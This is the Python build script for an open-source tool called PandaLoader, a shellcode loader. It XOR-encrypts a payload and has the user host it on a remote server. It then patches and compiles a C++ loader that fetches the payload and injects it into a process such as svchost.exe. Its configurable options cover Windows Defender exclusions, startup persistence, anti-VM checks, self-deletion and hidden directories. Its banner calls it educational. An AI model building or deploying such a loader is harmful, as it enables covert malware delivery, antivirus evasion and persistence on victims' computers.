import os
import sys
import time
import subprocess
import base64
import random
import string
import re
from pathlib import Path
import shutil
import threading
import ctypes

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
CYAN = "\033[36m"
YELLOW = "\033[33m"

"""
 This file is part of PandaLoader. (https://github.com/Chainski/PandaLoader)
Copyright (c) 2024 CHA1NSK1

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

def enable_utf8():
    os.system("chcp 65001 > nul")
def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)
def set_console_size(width, height):
    os.system(f"mode con: cols={width} lines={height}")
def print_banner():
    banner = [
        " ╔═══╗╔═══╗╔═╗ ╔╗╔═══╗╔═══╗    ╔╗   ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗ ",
        " ║╔═╗║║╔═╗║║║╚╗║║╚╗╔╗║║╔═╗║    ║║   ║╔═╗║║╔═╗║╚╗╔╗║║╔══╝║╔═╗║ ",
        " ║╚═╝║║║ ║║║╔╗╚╝║ ║║║║║║ ║║    ║║   ║║ ║║║║ ║║ ║║║║║╚══╗║╚═╝║ ",
        " ║╔══╝║╚═╝║║║╚╗║║ ║║║║║╚═╝║    ║║ ╔╗║║ ║║║╚═╝║ ║║║║║╔══╝║╔╗╔╝ ",
        " ║║   ║╔═╗║║║ ║║║╔╝╚╝║║╔═╗║    ║╚═╝║║╚═╝║║╔═╗║╔╝╚╝║║╚══╗║║║╚╗ ",
        " ╚╝   ╚╝ ╚╝╚╝ ╚═╝╚═══╝╚╝ ╚╝    ╚═══╝╚═══╝╚╝ ╚╝╚═══╝╚═══╝╚╝╚═╝ ",
        "               CHAINSKI'S CUSTOM SHELLCODE LOADER             ",
        "     supports x64 NATIVE & .NET shellcode built with donut    ",
        "              https://github.com/chainski/PandaLoader         ",
        "                  FOR EDUCATIONAL PURPOSES ONLY               "
    ]
    for line in banner:
     print(f"{BLUE}{line}{RESET}")
    print(f"{CYAN}[*] Welcome {os.environ['COMPUTERNAME']}{RESET}")
    print(f"{CYAN}[*] Configuring Build Dependencies{RESET}")
def processing_animation(script_block):
    frames = ['|', '/', '-', '\\', ' Loading Please Wait']
    stop_animation = threading.Event()
    def animate():
        counter = 0
        while not stop_animation.is_set():
            frame = frames[counter % len(frames)]
            print(f"\r{frame}", end="", flush=True)
            counter += 1
            time.sleep(1)
    animation_thread = threading.Thread(target=animate)
    animation_thread.start()
    try:
        script_block()
    finally:
        stop_animation.set()
        animation_thread.join()
        print("\r" + " " * 30 + "\r", end="", flush=True)
def get_command_version(command):
    try:
        result = subprocess.run([command, "--version"], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        return None
    except:
        return None
def get_valid_binary_input(prompt):
    while True:
        value = input(f"{prompt}").strip()
        if value in ["0", "1"]:
            return value
        print(f"{RED}Invalid input. Please enter 1 or 0.{RESET}")
def get_valid_url(prompt):
    while True:
        value = input(f"{prompt}").strip()
        if re.match(r'^http', value):
            return value
        print(f"{RED}Invalid URL. Please enter a valid URL starting with http.{RESET}")
def get_random_key():
    random_bytes = bytes(random.randint(0, 255) for _ in range(12))
    base64_string = base64.b64encode(random_bytes).decode('utf-8')
    return re.sub(r'[+/=]', '', base64_string)
def validate_shellcode_path(path):
    shellcode_path = Path(path)
    if not shellcode_path.exists():
        print(f"{RED}[*] Shellcode file '{path}' does not exist.{RESET}")
        return False
    return True
def validate_injection_target(target):
    if '\\' in target and '\\\\' not in target:
        print(f"{RED}Invalid injection target. Use double backslashes (e.g., C:\\\\Windows\\\\System32\\\\svchost.exe).{RESET}")
        return False
    if not target.lower().endswith('.exe'):
        print(f"{RED}Invalid injection target. Path must end with '.exe'.{RESET}")
        return False
    return True
def main():
    enable_utf8()
    set_console_size(150, 40)
    set_console_title("Panda Shellcode Loader")
    print_banner()
    processing_animation(lambda: time.sleep(1))
    gcc_command = "g++"
    version_output = get_command_version(gcc_command)
    if version_output:
        print(f"{GREEN}[*] GCC (or another C compiler) is found on the PATH.{RESET}")
        print(f"{GREEN}[*] Version information:{RESET}")
        print(version_output)
    else:
        print(f"{RED}[*] GCC (or another C compiler) is not found on the PATH. Please install GCC and add it to your PATH.{RESET}")
        sys.exit(1)
    while True:
        shellcode_file = input("Enter the path to the shellcode file (e.g., loader.bin): ").strip()
        if validate_shellcode_path(shellcode_file):
            break
        time.sleep(1)
    while True:
        injection_target = input("Enter the injection target (e.g., C:\\\\Windows\\\\System32\\\\svchost.exe): ").strip()
        if validate_injection_target(injection_target):
            break
        time.sleep(1)
    shellcode_path = Path.cwd() / shellcode_file
    startup_entry_name = get_random_key()
    directory_name = get_random_key()
    file_name = get_random_key()
    xor_key = get_random_key()
    print(f"{CYAN}[*] Generated XOR Key: {xor_key}{RESET}")
    print(f"{CYAN}[*] Injection Target: {injection_target}{RESET}")
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()
    key_bytes = xor_key.encode('utf-8')
    xor_bytes = bytearray(len(shellcode))
    for i in range(len(shellcode)):
        xor_bytes[i] = shellcode[i] ^ key_bytes[i % len(key_bytes)]
    xor_file_path = Path.cwd() / "xor.bin"
    with open(xor_file_path, 'wb') as f:
        f.write(xor_bytes)
    print(f"{GREEN}[*] Encrypted shellcode written to {xor_file_path}{RESET}")
    print(f"{YELLOW}[*] Upload xor.bin to your server, copy the direct download link and paste it here.{RESET}")
    shellcode_url = get_valid_url("[*] Enter the shellcode URL (starting with http): ")
    enable_admin = get_valid_binary_input("[*] Enter value for ENABLE_ADMIN (1 or 0): ")
    add_exclusion = get_valid_binary_input("[*] Enter value for ADD_EXCLUSION [admin required] (1 or 0): ")
    melt = get_valid_binary_input("[*] Enter value for MELT (1 or 0): ")
    enable_startup = get_valid_binary_input("[*] Enter value for ENABLE_STARTUP [admin required] (1 or 0): ")
    sleep_delay = get_valid_binary_input("[*] Enter value for SLEEP_DELAY (1 or 0): ")
    enable_antivm = get_valid_binary_input("[*] Enter value for ENABLE_ANTIVM (1 or 0): ")
    hide_directory = "0"
    if enable_startup == "1":
        hide_directory = get_valid_binary_input("[*] Enter value for HIDE_DIRECTORY (1 or 0): ")
        print(f"{CYAN}[*] Generated Startup Entry Name: {startup_entry_name}{RESET}")
        print(f"{CYAN}[*] Generated Directory Name: {directory_name}{RESET}")
        print(f"{CYAN}[*] Generated File Name: {file_name}{RESET}")
    panda_loader_path = Path.cwd() / "PandaLoader.cpp"
    backup_path = Path.cwd() / "PandaLoader_backup.cpp"
    if not panda_loader_path.exists():
        print(f"{RED}[*] PandaLoader.cpp not found.{RESET}")
        sys.exit(1)
    shutil.copy(panda_loader_path, backup_path)
    with open(panda_loader_path, 'r', encoding='utf-8') as f:
        panda_loader_content = f.read()
    injection_target = injection_target.replace('\\', '\\\\')
    replacements = [
        (r'#define ENABLE_ADMIN \d+', f'#define ENABLE_ADMIN {enable_admin}'),
        (r'#define ADD_EXCLUSION \d+', f'#define ADD_EXCLUSION {add_exclusion}'),
        (r'#define MELT \d+', f'#define MELT {melt}'),
        (r'#define ENABLE_STARTUP \d+', f'#define ENABLE_STARTUP {enable_startup}'),
        (r'#define SLEEP_DELAY \d+', f'#define SLEEP_DELAY {sleep_delay}'),
        (r'#define ENABLE_ANTIVM \d+', f'#define ENABLE_ANTIVM {enable_antivm}'),
        (r'#define HIDE_DIRECTORY \d+', f'#define HIDE_DIRECTORY {hide_directory}'),
        (r'#define STARTUP_ENTRYNAME OBF\("PERSISTENCE_REPLACE_ME"\)', f'#define STARTUP_ENTRYNAME OBF("{startup_entry_name}")'),
        (r'#define DIRECTORY_NAME OBF\("DIRECTORY_REPLACE_ME"\)', f'#define DIRECTORY_NAME OBF("{directory_name}")'),
        (r'#define FILENAME OBF\("FILENAME_REPLACE_ME"\)', f'#define FILENAME OBF("{file_name}")'),
        (r'#define XOR_DECRYPTION_KEY OBF\("XOR_KEY_REPLACE_ME"\)', f'#define XOR_DECRYPTION_KEY OBF("{xor_key}")'),
        (r'#define SHELLCODE_URL OBF\(L"SHELLCODE_URL_REPLACE_ME"\)', f'#define SHELLCODE_URL OBF(L"{shellcode_url}")'),
        (r'OBF\("INJECTION_TARGET"\)', f'OBF("{injection_target}")')
    ]
    for pattern, replacement in replacements:
        panda_loader_content = re.sub(pattern, replacement, panda_loader_content)
    with open(panda_loader_path, 'w', encoding='utf-8') as f:
        f.write(panda_loader_content)
    print(f"{GREEN}[*] Updated PandaLoader.cpp with customized values.{RESET}")
    build_command = 'g++ -w PandaLoader.cpp -O3 -std=c++17 -masm=intel -static -fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -fdata-sections -ffunction-sections -fno-exceptions -mwindows -s -Wl,--gc-sections -flto -pipe -lwininet -lpsapi -o PandaLoader.exe'
    print(f"{YELLOW}[*] Building PandaLoader.exe...{RESET}")
    result = subprocess.run(build_command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"{GREEN}[*] Build completed successfully. If you like the project consider leaving a star!{RESET}")
    else:
        print(f"{RED}[*] Build failed.{RESET}")
        print(f"{RED}[*] Compiler output:{RESET}\n{result.stdout}\n{result.stderr}")
    shutil.copy(backup_path, panda_loader_path)
    backup_path.unlink()
    print(f"{GREEN}[*] PandaLoader.cpp has been restored to its original state.{RESET}")
    if enable_startup == "1" and enable_admin == "1":
        uninstaller_path = Path.cwd() / "uninstaller.ps1"
        uninstaller_content = f"""if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}}
function CLEANUP {{
    $ErrorActionPreference = "SilentlyContinue"
    Remove-MpPreference -ExclusionPath @($env:userprofile, $env:programdata) -Force
    Write-Host "[!] Windows Defender Exclusions Removed" -ForegroundColor Green
    $directoryPath = "C:\\ProgramData\\{directory_name}"
    if (Test-Path $directoryPath) {{
        Write-Host "[!] Directory exists: $directoryPath"
        Remove-Item -Recurse -Force $directoryPath
        Write-Host "[!] Directory removed: $directoryPath" -ForegroundColor Green
    }} else {{
        Write-Host "[!] Directory not found: $directoryPath" -ForegroundColor Red
    }}
    $taskName = "{startup_entry_name}"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{
        Write-Host "[!] Scheduled task exists: $taskName"
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        Write-Host "[!] Scheduled task removed: $taskName" -ForegroundColor Green
    }} else {{
        Write-Host "[!] Scheduled task not found: $taskName" -ForegroundColor Red
        Write-Host "[!] CLEANUP COMPLETE" -ForegroundColor Green
    }}
    $scriptpath = $pscommandpath
    sleep 1
    Remove-Item "$scriptpath" -Force
}}
CLEANUP
pause
"""
        with open(uninstaller_path, 'w', encoding='utf-8') as f:
            f.write(uninstaller_content)
        print(f"{GREEN}[*] uninstaller.ps1 has been built!{RESET}")
if __name__ == "__main__":
    main()
    input("Press Enter to exit...")
